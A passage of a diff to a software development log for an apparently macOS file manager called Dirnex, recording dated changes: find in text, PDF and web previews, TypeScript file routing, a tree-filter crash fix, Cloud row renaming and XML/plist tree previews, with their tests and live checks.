+step to another file: on a mixed-case one, with Case Sensitive *and* Whole Word still on, `beta` found
+exactly **2** — the lowercase standalone ones — while `Beta`, `BETA` and `betaOnly` were all correctly
+left out. Over a CSV the same two options narrowed **3 of 3 rows** to **2 of 3**, dropping `Beta`, with
+the cell marks following the same rule. And the menu item's two branches were read off the live menu
+bar: over the text preview there is no "Filter" item and the closest match is **"Find…"**, over the
+table there is no "Find…" and the closest match is **"Filter"**.
+
+**Not verified live:** Return and ⇧Return themselves — background computer-use cannot press Return in
+a text field, it sets the field's selected text to a newline (docs/NOTES.md ▸ Live verification), which
+this run reproduced as a puzzling "1 of 2 matches" before a clean retype gave the expected 5. They are
+covered by 4 tests and 2 controls. Also unverified live: the options over a rendered page, a PDF or a
+JSON tree (each shares its call site with a surface that was driven), and a physical Esc. **Left
+undone:** pattern search, for the measured reason above; the options persisting across surfaces or
+launches; and a match in a PDF that no text layer covers.
+
+**2026-09-18 — the last surface the find could not reach, and what the question turned up instead.
+VERIFIED LIVE.** Asked for as "also add find to the Quick View preview if possible" — the
+`QLPreviewView` backend, which the entry below left undone as "whose text is in another process".
+Probed before any Swift, and the probe answered a different question than the one asked.
+
+- **The answer to the question as asked is no, and it is now measured rather than asserted.** The
+  backend renders out of process and no public API searches it — but the stronger half is what
+  *reaches* it. Reproducing `show`'s routing chain predicate for predicate over 628 000 real files
+  under `~/Dev`, `~/Documents`, `~/Downloads`, `~/Desktop`, `~/Pictures`, `~/Music` and `~/Movies`:
+  549 953 land on a surface that already finds, and the 78 574 that do not are video, audio,
+  archives, binaries, certificates, fonts and 3D models — **nothing with findable text**. So the
+  item is closed as *cannot, and need not*, rather than left open. A certificate is the one arguable
+  case and was left alone deliberately: a `.pem` is base64 armor, and Quick Look's certificate panel
+  is more useful than its own source.
+- **What the same probe found is that 53 000 files on this Mac had no find because they were never
+  text.** `.ts` resolves to `public.mpeg-2-transport-stream` and `.mts` to
+  `public.avchd-mpeg-2-transport-stream`, both conforming to `public.movie`, so every TypeScript file
+  went to Quick Look to be drawn as a video that will not play — 52 934 `.ts` and 287 `.mts` under
+  `~/Dev`. `.tsx` and `.cts` beside them resolve to *dynamic* types and reached the text preview all
+  along, which is why it stayed quiet: most of a project's TypeScript previews correctly and the
+  `vite.config.ts` is the odd one out. `SyntaxLanguage` has claimed all four with a grammar since
+  M17; for two of them the router could never deliver a file to it.
+- **The fix is four lines and is stated as a rule, not as two special cases.**
+  `QuickViewPreviewView.isMistypedSource` asks whether a *name* a grammar claims is contradicted by
+  a declared, non-text type, and routes such a file into the branch `isUnclaimed` already owns —
+  where the **bytes** decide and a binary goes on to Quick Look. Nothing is decided by the name: it
+  only buys the file the byte test. Measured over all 148 extensions the scanner claims, exactly
+  these two need it today, so the rule and the pair are the same set — and that count is deliberately
+  **not** asserted, being a fact about macOS's type table rather than about this app (a third one
+  appearing is the rule working, and a test pinning the number would fail a pass that did nothing
+  wrong). The premise *is* asserted, so a macOS that re-types `.ts` fails loudly.
+- **The control that makes it safe is a real transport stream, built to spec rather than captured.**
+  Packet one is a PAT whose `pointer_field` and `table_id` are both `0x00`, so the first NUL is at
+  **byte 2**, far inside `TextPreview.sniffLength`. A fixture holding both populations under the same
+  extension — and both typed `public.mpeg-2-transport-stream`, so only the bytes separate them — is
+  what the live run drove.
+
+Tests: 5 app in a new suite, no core change. Three controls, each failing only its own test and no
+other suite: the predicate neutered to always-false (3 issues, both TypeScript tests), the grammar
+check dropped (6 issues, all in "a binary no grammar claims still goes to Quick Look"), and the text
+guard dropped (6 issues, all in "a file whose type already says what it is is not second-guessed") —
+the last two being the narrowness halves, without which "narrow" quietly becomes "show everything as
+text". The always-false control is deliberately the *permissive* spelling, so it can only take the
+old Quick Look branch and can raise no dialog.
+Validation: both linters, 3 646 core tests (unchanged), 1 366 app tests — 1 361 before, plus exactly
+these 5 — with the one pre-existing known issue. No new strings, so all 14 languages carry over.
+
+Live, in the Debug build launched by path (`pgrep` read back, and `isMistypedSource` demangled out of
+`Dirnex.debug.dylib` to be sure it was not a stale binary). `vite.config.ts` drew as **coloured,
+selectable text** where it had drawn a video icon; ⌥⌘F over it read **"1 of 5 matches"** with the
+current one orange and the other four in the find yellow, the syntax colours intact around them, and
+↓ read "2 of 5" with the orange moved on. Then the control on the same fixture: `clip.ts`, the real
+stream, kept **Quick Look's media preview** and took the find bar away with it.
+
+**Not verified live:** a `.mts` file, whose type differs from `.ts` only in name; a physical Esc; a
+cloud-placeholder `.ts`, which the branch refuses to read by design (`refusingPlaceholders`). **Left
+undone:** find in the `QLPreviewView` backend, now closed as measured-impossible rather than pending;
+Return stepping to the next match rather than handing the keyboard back; the menu item's title, which
+stays "Filter"; and case-sensitive, whole-word or pattern search.
+
+**2026-09-17 (later still) — the find reaches the rendered page and the PDF. VERIFIED LIVE.** Asked
+for as "add find to the rendered pages and pdf" — the two surfaces the pass earlier the same day left
+undone, "each its own mechanism". They are, and both were probed before any Swift.
+
+- **One state machine, not three.** `QuickViewFilterHost` split again: `QuickViewFind` holds the
+  matches, the current one and the search in flight, and `QuickViewFindHost` runs everything that is
+  the same over all three surfaces — the search off the main actor, discarding one the reader has
+  moved past, picking the match to make current, stepping with wraparound, the count. Each surface
+  answers only what it alone can: what its text *is* (asked asynchronously, since two of the three
+  are a round trip), how a match is drawn, how one is brought into view, and where a search with no
+  current match begins. The text preview moved onto it unchanged — its 13 tests are the guard.
+  `TextSegmentMap` (core) is the arithmetic both new surfaces need: a global offset back into the
+  piece of a joined text that holds it, which the PDF spends on pages and the page on frames. 11
+  tests, and writing them caught a real defect — an offset landing in a *separator* answered
+  `(index: 1, offset: -1)`, a negative offset bound for `PDFPage.selection(for:)`.
+- **The rendered page** (`QuickViewWebView+Find`, `QuickViewPageFindScript`). The page is read through
+  an isolated content world, which was measured to evaluate and read the DOM with the page's own
+  scripts **off** — so finding neither needs nor grants the JavaScript a preview declines. Matching is
+  `DirnexCore`'s rather than `WKWebView.find`, for two reasons: the bar counts and `WKFindResult`
+  reports only whether *something* was found, and an HTML or Markdown file has a source style one
+  keystroke away that finds by the same rule. Highlighting is the CSS Custom Highlight API, which
+  paints without touching the DOM, so a page cannot be damaged by being searched. A converted **Excel
+  workbook** draws its sheet in a `file://` iframe, which is cross-origin and unreachable from the
+  page — a `WKFrameInfo` captured in `decidePolicyFor` is not, so the frames are searched beside the
+  main document and `TextSegmentMap` cuts the offsets back apart.
+- **The PDF** (`QuickViewPDFSurface`, `+Find`), which is also every Pages, Numbers and Keynote
+  document. `PDFDocument.string` is read once off the main actor and kept — 369–423 ms on a 231-page
+  manual, 1 ms thereafter, and measured safe to read while the main thread lays the same document out.
+  `PDFDocument.findString` is 28× faster and was **refused**: it folds ß against ss, a ﬁ ligature
+  against `fi`, and `cafe` against `café`, where every other surface counts accents. A test in each
+  new suite pins that choice, so reaching for `findString` later goes red. The bare `PDFView` gained a
+  container to carry the bar; `preview.pdfView` still answers the view itself, so nothing that zooms or
+  reads the document changed. `QuickViewPreviewView+QuickLook` was split out in the same pass, the
+  class having reached SwiftLint's `type_body_length`.
+- **One bug only the running app could show, and the suite cannot watch the fix.** The CSS Custom
+  Highlight API does not invalidate the area a highlight used to occupy, so a replaced or cleared match
+  went on being painted: *two* current-match oranges on screen at once while the registry held one. The
+  model was right and the pixels were stale — which is why nine tests reading the registry back through
+  the page's own JavaScript were green against it, and why a `takeSnapshot` probe cleared the exact
+  sequence that was failing (it re-renders rather than reading the screen). A ⌘+ step wiping every
+  stale highlight is what named it. Fixed with a paint nudge on the root reverted by whichever of a
+  frame and a timer comes first — **not** belt and braces: `requestAnimationFrame` never fires in a page
+  that is not rendering, which the one test that *can* watch this caught by finding the page left
+  permanently dimmed (docs/NOTES.md ▸ AppKit, three entries).
+
+Two of the tests were wrong before they were right, both found by their own controls. The page
+fixture settled inside a read that callers also looped over, so the failing path was 80 000 JavaScript
+round trips and a test host that sat idle for ten minutes; and the reload test read the surface before
+the asynchronous reload landed, so it passed with the redraw deleted — it now waits on a marker the
+reload takes with it (docs/NOTES.md ▸ Testing, two entries).
+
+Tests: 11 core in a new suite, 12 + 11 app in two new suites, plus the text preview's 13 unchanged
+through the refactor. Controls: two core (a separator swallowed by the next segment, empty pieces kept)
+and eight app, each failing only its own tests — the PDF page separator dropped (which the *count* test
+still passed, so only the mapping assertion could see it), the page walk counting scripts and hidden
+text, no current-match colour on either surface, a new page keeping the old find, stale highlights not
+taken off before new matches install, the bars not exempt from the surface's mouse swallow, and a
+reload that does not redraw.
+Validation: both linters, all four CI scripts (1 039 localization keys, and **no new strings** — the
+bar's wording is reused, so all 14 languages carry over), 3 646 core tests, 1 361 app tests, one
+pre-existing known issue.
+
+Live, in the Debug build launched by path (`pgrep` read back, and the new JavaScript grepped out of
+`Dirnex.debug.dylib` to be sure it was not a stale binary). Full Window over a three-page PDF: `beta`
+counted "1 of 5 matches", the current one orange and the rest in the find yellow; ↓ three times read
+"4 of 5" and had scrolled to **page 2** with the match on screen, once more "5 of 5" on page 3 over an
+upper-case `BETA`, and once more wrapped to "1 of 5" back on page 1. An HTML page: "1 of 6 matches"
+with the current one orange *inside* the blue `<h1>`, the heading's own colour intact around it, under
+a header reading **(no JavaScript)** — the page's scripts off while the find ran; ↑ wrapped to "6 of 6"
+and scrolled past a 1400 px spacer to bring the last match into view. A Markdown page: "1 of 5
+matches", matching the **rendered** text rather than the source's `**beta**`. Then the A/B that is the
+fix's only evidence: before it, replacing `beta` with `changelog` left all five `beta` highlights
+painted beside the new one; after it, only `changelog` is highlighted and clearing restores the page
+exactly as rendered.
+
+**Not verified live:** a physical Esc, which the tooling cannot send; a multi-sheet Excel workbook,
+having none to hand — the frame route is covered by the probe that measured it and by nothing else;
+typing a letter at a time rather than setting the field whole; the light appearance. **Left undone:**
+finding in the `QLPreviewView` backend, whose text is in another process; Return stepping to the next
+match rather than handing the keyboard back; the menu item's title, which stays "Filter"; a match in a
+PDF that no text layer covers, i.e. a scanned page, which has no text to find; and case-sensitive,
+whole-word or pattern search.
+
+**2026-09-17 (later) — Quick View finds text in the text preview. VERIFIED LIVE.** Asked for as "can we
+make a search in the preview?", with a screenshot of `com.apple.networkextension.plist` as source text,
+and three choices settled first: find in place (every match highlighted, one current, stepped through)
+rather than filtering lines; the table's own bar on ⌥⌘F rather than the system find bar, whose
+keyboard model Quick View does not share and whose ⌘G is Places; and every text surface in this pass
+(source text, plists, CSV as source, RTF and OpenDocument text) but not rendered pages or PDFs.
+
+- **`TextFindMatches` (core)** finds a `FilterQuery` in a text by the filters' own rule (case ignored,
+  accents counted, ASCII a byte at a time, anything else by character) and answers in UTF-16 offsets,
+  counted during the scan: mapping 145 000 `String.Index` ranges to `NSRange` had cost 17 ms on a 4 MB
+  file. It stops at 100 000 matches and says so, reads a cancellation flag, and does the arithmetic of
+  stepping with wraparound, where a search starts, and which matches overlap what is on screen. Release
+  build, over the 4 MB catalog: 4–7 ms for an ASCII query, 130–190 ms for Cyrillic or CJK. 12 tests, one
+  holding both branches to the filters' marks.
+- **The app half.** `QuickViewFilterHost` split into the bar's shared behaviour and
+  `QuickViewRowFilterHost`, so ↑ and ↓ step rows in the table and tree and matches in the text.
+  `QuickViewTextView+Find` runs the search off the main actor over a copy of the text, makes the first
+  match from the reader's place current (from the current match while typing refines the query),
+  highlights only the matches within 2 000 UTF-16 units of the viewport, updating as it scrolls, and
+  counts "3 of 17 matches", "No matches", or "3 of 100 000+ matches". A new file, a style switch or
+  clearing the text takes it all away. The bar hides its picker and says "Find in Text"; it is exempt
+  from the surface's mouse swallow while it is up. View ▸ Filter stays one command and gains text,
+  source and matches as keywords. Five strings in all 14 languages, the counts with plurals.
+- **Three things only the running app showed, each with every test green.** TextKit 2 rendering
+  attributes, the first way the highlights were drawn, are stored by `NSTextView` and never painted:
+  not after invalidating the layout, the rendering attributes or the display, while reading them back
+  answered exactly what was stored. The colors now go into the text storage, with each match's own
+  colors kept run by run and put back. A match far into a large file did not land on screen with any
+  single scroll, because its position is an estimate that moves after scrolling to it: on the 4 MB
+  file `scrollRangeToVisible` took 1 ms, relocating the viewport 0.9 s and laying out everything above
+  the match 1.8 s, and all three came to rest off screen. The system's scroll plus corrections on later
+  turns converges. And in a formatted document in Dark Mode, adaptive color mapping turned black match
+  text white on the yellow; a named dynamic black is left alone (docs/NOTES.md ▸ AppKit, twice).
+
+Tests: 12 core, 13 app in a new suite, and two existing tests that asserted a text preview could not be
+filtered now assert that it finds, one of them over JSON in the source style too. Controls: five core, each failing only its own tests (a four-byte scalar counted as
+one UTF-16 unit, the limit off by one, cancellation ignored, no wraparound, the character branch counting
+characters as units). Ten app, nine of which failed only what they aimed at: originals never kept (5 tests, since nothing then comes off), the
+highlight removed without its colors put back (the restore test), every match highlighted rather than
+those near the screen, refining starting from the top (once its fixture stopped being one where both
+rules land on the same match, which left the first run inert), a new file keeping the find, the bar not
+exempt from the swallow, plain black match text, text not filterable (3), and the previous current
+match not recoloured. One stayed inert: removing the settling corrections, since the test window is
+never on screen and the first scroll lands exactly there. The live A/B is its evidence, the build
+without them logging the last match off screen and the build with them showing it. Validation: both
+linters, all four CI scripts (1 039 localization keys), 3 635 core tests, and the app suite (1 337
+tests, 1 222 executed with the live-server suites skipped, one pre-existing known issue).
+
+Live, in the Debug build launched by path. Full Window over the plist: `cf$uid` counted "1 of 2 285
+matches", the first in orange and the rest in yellow with black text; ↓ twice made it "3 of 2 285"
+with the keyboard still in the field; the field's clear button gave back the file's own colors. A 4 MB
+copy of `Localizable.xcstrings` as `.txt`: `zh-hant` found 1 396, ↑ wrapped to the last one at the end
+of the file, on screen and in orange, and ↓ went back to the first. An RTF in Dark Mode: black on
+yellow and orange, and clearing restored its green word and peach background. Pane mode (⌃Q), as in the
+report: the bar over the left pane, "1 of 2 matches". **Not verified live:** a physical Esc, which the
+tooling cannot send; typing a letter at a time rather than setting the field whole; the light
+appearance; a pinch-zoomed preview. **Left undone:** finding in rendered pages (Markdown, HTML, Office
+documents) and in PDFs, each its own mechanism; Return stepping to the next match, which hands the
+keyboard back as it does over the table; the menu item's title, which stays "Filter"; text past the
+4 MB read limit; and case-sensitive, whole-word or pattern search.
+
+**2026-09-17 — the tree filter no longer quits the app on the second letter. VERIFIED LIVE.** Reported
+with a crash report as "the app crashes when i put a second symbol in the filter, for example vi",
+over `com.apple.networkextension.plist` in 1.0.11-beta.22. Four reports from the day, all the same:
+`EXC_BREAKPOINT` in an `@objc` thunk whose source string is `QuickViewTreeView+Rows.swift` line 52,
+`outlineView(_:child:ofItem:)`, under AppKit's `loadItemEntryLazyInfoIfNecessary` inside
+`collapseItem(nil, collapseChildren: true)`. `applyFilter` swapped in the new filter, its children and
+its top level first and collapsed after, and the collapse fetches rows the outline view had counted and
+never drawn, from the new answers: after `v`, `$top` and `$version` sat below 1 300 open rows, and after
+`vi` the top level held one key, so AppKit's request for top-level child 3 ran off `topLevel`. The
+collapse now comes first. A scratch harness with the real `PropertyListTree` and a copy of the data
+source reproduced it on every run and was clean with the order swapped, and it showed `reloadData`
+fetching nothing stale, so `show` and `clearDocument` stay as they are (docs/NOTES.md ▸ AppKit). One
+app test types `v` and then `vi` over a hundred open entries with three keys below them. Control: with
+the old order the test host died with `Index out of range`, a crash report with the same stack as
+the user's, and the relaunch reported `0 tests in 1 suite passed`. Live, in the Debug build on the
+same file: `v` (1 158 values), `vi` (916), `vide`, back to `v`, then `vpn` (6), with no crash. Both
+suites green (3623 core, 1324 app), both linters clean; the core was not touched.
+
+**2026-09-16 (after the CloudDocs container) — a Cloud row's right-click menu opens the place.
+VERIFIED LIVE.** Asked for as "add Open for Cloud items, like the others have it". The iCloud Drive,
+Photos and provider-mount rows offered only Rename… (and Restore Original Name), where the favorite,
+Trash and unlocked-vault menus lead with Open. `buildCloudPlaceMenu` now puts Open and a separator
+first, the favorites menu's shape. The item carries the place's identity like its neighbours, and
+`openCloudPlaceItem` finds the row by it and calls `activate(_:)`, the funnel a click uses, because
+iCloud Drive assembles a merged listing and Photos asks for library access rather than navigating to
+a path. The existing menu test now expects the order, and a new app test sends Open for all three kinds
+of place and checks the delegate heard the same call a click makes (iCloud, Photos, the mount's
+path). "Open" was already translated in every catalog. Live: right-clicking iCloud Drive in the Debug
+build showed Open above Rename…, and Open put the right pane in iCloud Drive. App suite green (1323),
+both linters clean; the core was not touched.
+
+**2026-09-16 (after Focus Sidebar) — F7 at the top of a tree over iCloud Drive creates where list mode
+does. VERIFIED LIVE.** The other half of what the Cloud-renames pass found. `creationDirectory` took
+`Panel.cursorDirectory`, the parent of the cursor row's path, at every level of a tree. At the root
+level of the merged iCloud listing that is the wrong directory: a loose row's parent is
+`com~apple~CloudDocs`, which the sheet then named («Create a folder in “com~apple~CloudDocs”»), and an
+app library's row is `com~apple~Pages/Documents`, so F7, ⇧F4 and a paste there targeted the app's
+container beside `Documents`, which iCloud Drive does not show.
+
+- **The rule (core).** `Panel.cursorDirectory` answers by the cursor row's depth: a root-level row
+  answers the pane's own path, as every row of a flat list does, and only a deeper row answers its
+  parent. For an ordinary folder the answer is unchanged, since a root row's parent is that folder.
+- **The app.** `creationDirectory` maps the pane's own path to `writeDirectory` (the CloudDocs
+  container for the merged listing), which also drops the separate `isTree` branch. The new
+  `createsInPaneDirectory` decides both `creationDirectoryName` (name the pane, or the deeper folder)
+  and ⇧F4's wording, which compared the target with `panel.path` and so always named the folder over
+  the merged listing, even in list mode.
+- **Tests.** Two core tests over a merge built with `ICloudFixture`, `ICloudDrive.libraryRow` and
+  `merge` (the root level answers the pane; the deeper levels inside a library and a loose folder
+  answer their folders). Three app tests in `CreateTargetTreeTests`: root-level rows target the
+  container, name the pane and take the paste; deeper rows do not; a tree over an ordinary folder is
+  unchanged. The two merged app tests read this Mac's real container through `writeDirectory`, so
+  they are skipped where there is none. Controls: the old core rule failed both new core tests, and
+  "always the pane" failed the deeper test plus five existing tree tests; the old core and app code
+  failed only the root-level app test (the target on the library row, the name on all three rows);
+  "always the container" failed only the deeper app test. Both suites green (3620 core, 1319 app),
+  both linters clean.
+- **Live, in the Debug build**, left pane in tree mode on iCloud Drive, each sheet cancelled. F7 on
+  the loose `Car` folder and on the `Pages` library row read «Create a folder in “iCloud Drive”.»; F7
+  on a file inside the expanded `Car` read «… in “Car”.»; ⇧F4 on `Car` read «Open a file, or type a
+  new name to create one.» Launched through LaunchServices the rebuilt build had no Full Disk Access
+  and listed only `Car`, so the library row was checked in a second run started from a shell, which
+  borrows the shell's grant.
+- **The name one level inside a library, asked for as a follow-up.** The target there was already
+  right (`com~apple~Pages/Documents`) and the sheet said «… in “Documents”», because the name is the
+  target's `VFSPath.displayName`. List mode inside the library said the same, and so did its tab chip,
+  while the path bar's crumb read "Pages". `ICloudLocation.libraryTitle(of:)` (core) answers the app's
+  name only for a library's own `Documents` folder, through the lookup and fallbacks `trail` uses (now
+  shared); a loose folder called `Documents`, which `ICloudDrive.isMergedRoot` would take for a library,
+  is ruled out first. `displayName` asks it, and the system-name fallback moved from `PathBarView` onto
+  `VFSPath.systemName` so the crumb and the name share it. Three core tests (the name; agreement with
+  the crumb for the cached, translated, system and bundle-id sources; nine other folders keep their
+  names) and new assertions in two app tests. Controls: without the CloudDocs exclusion, or with
+  "anywhere inside a library", the narrowness test fails; without the `displayName` branch both app
+  tests fail. Live:
+  F7 on the file inside the expanded `Pages` row, and in list mode inside the library, read «Create a
+  folder in “Pages”.», and both tab chips of a second tab there read "Pages". Both suites green
+  afterwards (3623 core, 1320 app), both linters clean.
+- **And the CloudDocs container itself, a second follow-up.** A pane standing in
+  `com~apple~CloudDocs` (reached by a typed path, a pin or `reveal`) drew only the "iCloud Drive" root
+  crumb while its tab chip and F7 said `com~apple~CloudDocs`. `CloudPlaceTitle.iCloudContainer`,
+  shaped like `mountRoot`, answers the iCloud Drive row's title (so a rename of the row follows) for
+  that exact path and nothing else, and `displayName` asks it. Two app tests (the title, renamed and
+  not, through `displayName` and `PanelTab.title`; six other paths keep their names). Controls: without
+  the `displayName` branch the first test fails twice; matching the container "or anything inside it"
+  fails the narrowness test and the loose-`Documents` assertion in `VFSPathDisplayNameTests`. Live,
+  after `reveal` put the right pane in the real container: F7 read «Create a folder in “iCloud
+  Drive”.» and both chips of a second tab read "iCloud Drive". Both suites green (3623 core, 1322 app),
+  both linters clean.
+
+**2026-09-16 (after the Cloud renames) — View ▸ Focus Sidebar lands on the place the pane is in.
+VERIFIED LIVE.** Asked for as "fix the Focus Sidebar landing on Recents too", after the rename pass
+found it on an iCloud pane. The cursor went to the row whose path *equalled* the pane's and otherwise
+to the first row of the list, and almost nothing is equal: iCloud Drive's listing is `icloud:/…`
+while its row names the CloudDocs container, and any folder one level inside a pin, a Photos month, a
+bucket, the Trash or Recents itself matched nothing. So Recents was where Focus Sidebar went from most
+of the app, not only from iCloud.
+
+- **`SidebarPlaceLocator` (core)** answers with the rule the path bar already draws: the place whose
+  territory holds the location, and of several the deepest (`~/Dev/Common` is in Dev, not Home, and
+  Home rather than Macintosh HD). Each place's territory is its folder, a volume's mount, an unlocked
+  vault's mount point, a saved server's backend root (none for SMB, whose share is a volume), a
+  provider mount's own root rather than the `My Drive` its row opens, the whole of
+  `~/Library/Mobile Documents` plus the merged listing for iCloud Drive, and the Photos and Trash
+  backends. A results tab matches exactly or not at all: Recents by its listing name (moved into the
+  core as `RecentsQuery.listingName`, which the app's `recentsIdentity` now reads) with no query, a
+  saved search by its query and scope, a tag by `FileQuery(tags:)` everywhere. Inside an archive,
+  where only a pin into the archive can match the path, the question falls back to the outermost
+  archive's file. Ties go to sidebar order.
+- **The app.** The pane reports `sidebarLocation` (path, the tab's query and scope, the archive file);
+  the sidebar keeps the groups its last rebuild assembled (`placeGroups`) rather than re-reading every
+  store and every cloud mount on the keystroke, and `row(showing:)` returns the place's row, or its
+  section's **header** when the section is folded shut or the tag sits past the stock seven.
+- **Tests.** 20 core tests and 7 app tests. Eight core controls run one at a time (first match wins,
+  ties to the last, the iCloud listing dropped, iCloud narrowed to its container, a mount by its entry
+  directory, Recents ignoring the query, a saved search ignoring scope, no archive fallback) each
+  failed its own tests, the first one eight of them; two app controls (no header fallback, no archive
+  file reported) failed theirs. Both suites green (3618 core, 1316 app), both linters clean.
+- **Live, in the Debug build.** With the sidebar cursor first parked on Recents each time and focus
+  handed back to the pane, Focus Sidebar landed on iCloud Drive from its listing and from its `Car`
+  folder, and on Home from `~/swtest`.
+
+**2026-09-16 (after the XML previews) — the Cloud rows can be renamed. VERIFIED LIVE.** Asked for as
+"let's make it possible to rename Cloud items", over a screenshot of the section showing two Google
+Drive rows cut to `oleg.verhog…` and `oleg.email.a…`. Nothing there can be renamed for real — a
+mount's folder belongs to its sync client, and iCloud Drive and the Photos library have no name a file
+manager may change — so what is renamed is the label Dirnex already made up for each place. It is
+shown **wherever Dirnex names that place**: the sidebar row, Go ▸ Places, the path bar's root crumb and
+a tab parked there. A rename that stopped at the row would leave the path bar calling the same place
+"Google Drive" under a row saying "Work".
+
+- **`SidebarItemNames` and `CloudPlaceIdentity` (core).** The names sit beside the rows, as the Cloud
+  order already did, keyed by the same identities (`icloud`, `photos`, `mount:<directory>`). Those
+  identities moved into the core from `SidebarViewController.orderIdentity(of:)` and are pinned byte
+  for byte, since both stores are already on disk under them. A name equal to the default, or one that
+  normalizes to nothing, **clears** the entry rather than pinning a copy: "iCloud Drive" is translated,
+  and a mount's label gains its account when a second account appears, so a stored default would
+  freeze the row. Control characters (a pasted line break included) are stripped and whitespace
+  trimmed, on the way in from a hand-edited store as well.
+- **The app.** `CloudPlaceNameStore` (JSON in `Dirnex.cloudPlaceNames`, the key removed when the last
+  name goes) and `CloudPlaceTitle`, which every surface reads, with the "iCloud Drive" literal now
+  written once instead of three times. A Cloud row's right-click menu offers Rename… and, once
+  renamed, Restore Original Name; F2 on a selected Cloud row reaches the same prompt, whose emptied
+  field also restores the original (shown as the placeholder). The sidebar rebuilds on a rename, and
+  each pane redraws its path bar in place (`PathBarView.reloadLocation`, since `setPath` ignores an
+  unchanged path) and its tab strip. The notification carries the defaults domain written to, and
+  every observer watches `UserDefaults.standard` only, so a test saving into a scratch domain redraws
+  nothing in the test host.
+- **Two naming fixes the rename needed.** The merged iCloud tab no longer captures a chip title when
+  the listing is gathered — it reads `displayName`, which now names the `.icloud` location through
+  `CloudPlaceTitle` — so the chip follows a rename, and F7's sentence there stops printing the English
+  identity `ICloudLocation.mergedName` in every language. And a tab at a provider mount's **root** is
+  called what the row is called, where it used to read the folder's `Dropbox-Home`
+  (`CloudPlaceTitle.mountRoot`: a string test turns away everything that is not a direct child of
+  `~/Library/CloudStorage` before the one `readdir`, and the store is read only on a hit).
+- **Tests.** 15 core tests, 12 app tests (`CloudPlaceRenameTests`: the names handed in wherever a
+  surface allows, the path bar through a new `cloudPlaceNames` seam, mount roots against a temp home,
+  the store in a scratch domain). Two Photos assertions compared against the default library title
+  and would fail on a Mac where the row was renamed; they compare against the current title now.
+  Seven negative controls run together — the in-place redraw made a no-op, the mount row drawn by its
+  default, the iCloud chip title restored, F2 validated for vaults only, the notification posted to
+  the app's domain, the mount-root parent guard dropped, Restore offered unconditionally — failed
+  exactly the seven tests aimed at them and left the other five green. Both suites green (3598 core;
+  1309 app, the live-server suites skipped with no servers up), both linters clean, and
+  `check_localization_keys.py` finds every extracted key: the three new strings carry all 13
+  translations.
+- **Live, in the Debug build driven in the background.** F2 on the sidebar's Dropbox row, "Team
+  Dropbox": the row, the path bar's root crumb (the pane was standing at the mount's root) and, after
+  a New Tab, both chips changed at once, and the store held `{"mount:Dropbox-Home":"Team Dropbox"}`.
+  Emptying the field put "Dropbox" back on all three surfaces with no navigation, and removed the key.
+  iCloud Drive renamed to "Personal" changed its row, chip and crumb; typing "iCloud Drive" back left
+  the store empty. With Recents selected, Rename is disabled. Not checked live: the right-click menu
+  (a background session cannot open a context menu; its builder is unit-tested) and Go ▸ Places,
+  which is filled only when opened from a key window.
+- **Found on the way, left for a pass of their own.** In tree mode at the top of the merged iCloud
+  listing, F7 names the row's real parent — "Create a folder in “com~apple~CloudDocs”" — and for an
+  app-library row would target the app's container rather than its `Documents`. And View ▸ Focus
+  Sidebar from an iCloud pane selects Recents, because the pane's `icloud:` path matches no row's
+  real container path (fixed in the entry above; the F7 half two entries above). Both predate this pass. Running the Debug build over iCloud also raised the
+  "Full Disk Access has probably been reset" offer, which cleared `hasReadICloudAppLibraries` in the
+  shared domain; it re-arms the next time a build with the grant reads the app libraries.
+
+**2026-09-16 (after the binary plists) — XML previews as a tree, a property list as its keys and values,
+and a list of like elements as the CSV table.** Asked for as "can we implement a similar table preview for
+xml, like we already have for json / csv?", with three choices settled first, each the recommended one
+of its question: the JSON rule's shape (a tree for every file, the table when the root's children are
+all one element with like fields); every attribute a row of its own, `@name` and its value in quotes,
+while a closed element lists its attributes in its value column; and a property list read as keys and
+values, the way the JSON tree reads an object, rather than as `dict`, `key` and `string` rows. The
+survey behind the questions covered 4,707 XML-family files under `~/Dev`, `~/Documents`, `~/Downloads`,
+`~/Library/Preferences`, `/etc` and `/opt/homebrew/etc`: 2,331 `.plist` (938 binary), 1,505 `.xml`, then
+`.xaml`, `.xib`, `.xcprivacy`, `.props`, `.csproj`, `.svg`, `.targets` and `.storyboard`; 534 of the
+2,372 non-plist files had a root of like records (`catalog.xml`'s 535 `<Book>`, Android's
+`<resources>`).
+
+- **The parser was decided by a probe (docs/NOTES.md ▸ AppKit).** `XMLParser` returned one tag's five
+  attributes in three orders on three runs, and `XMLDocument` threw on a file cut in half, so XML got a
+  byte-range scanner as JSON did.
+- **`TreeDocument` (core)** is what the one tree view reads — rows, labels with a kind rather than a
+  color, path, strip text, ⌘C text, filter and record table — so JSON, XML and property lists share an
+  outline view, strip, filter and zoom rather than growing a second tree. `JSONFilter` became
+  `TreeFilter`, built in one generic pass; the rows a filtered tree lists and opens moved into the
+  protocol unchanged; JSON's labels, strip and copy text moved from the app into `JSONDocument+Tree`; and
+  the record-table builder JSON had became `RecordTableBuilder`, shared.
+- **`XMLTree` (core)** scans the UTF-8 bytes once with a stack of its own, 48 bytes a node. An element
+  lists its attributes, then its child elements and the text beside them; a leaf's text is its value,
+  held back during the scan until a child element shows it is not one. Comments, processing
+  instructions and the document type are skipped, CDATA is text, the predefined entities and character
+  references are read and other entities kept, line breaks and attribute whitespace are normalized as
+  the spec says, several top-level elements are several roots, and anything not well formed is shown as
+  text. A cut file closes its open elements, marked, and leaves out the tag it split. Paths are XPaths
+  (`/Project/ItemGroup[1]/Reference[3]/@Include`, `text()[2]`); the strip and ⌘C read a value as text
+  and an element as its source, taken back to its own indentation. Its record table is the root's
+  children when they share a name: `@name` columns, a column per child element (the first of a repeated
+  name), `#text` for a record's own text, and a child holding elements as its source on one line.
+- **`PropertyListTree` (core)** reads an `XMLTree` whose root is `<plist>`: a dictionary's key and value
+  one row in the file's order, array elements by index, and strings, integers, reals, dates, data (as
+  `<48656c6c 6f>`) and booleans typed. The path is `PlistBuddy`'s (`:Types:0:UTTypeIdentifier`). Anything
+  else in a `<plist>` makes it generic XML (`XMLTree.document(from:)`); a dictionary cut part-way through
+  a pair drops the key.
+- **Checked against oracles before tests.** A release-build harness over the corpus read 4,701 files (the
+  4 refused were `key=value` `.props` files and a Logstash config, which `expat` refuses too) in 2.4 s with
+  every label, path and a filter worked out, the slowest file 12 ms; the table count matched the survey's
+  534 exactly. Element and attribute counts agreed with `expat` on all 3,765 text XML files. A canonical
+  digest of names, attribute values in order and leaf text disagreed on 44 files, all line-break and
+  attribute-whitespace normalization, then on 2, both trimming U+00A0 and U+200B with Foundation's
+  whitespace set; both fixed, 0. Property lists agreed with `plistlib` on 2,477 of 2,477, binary ones
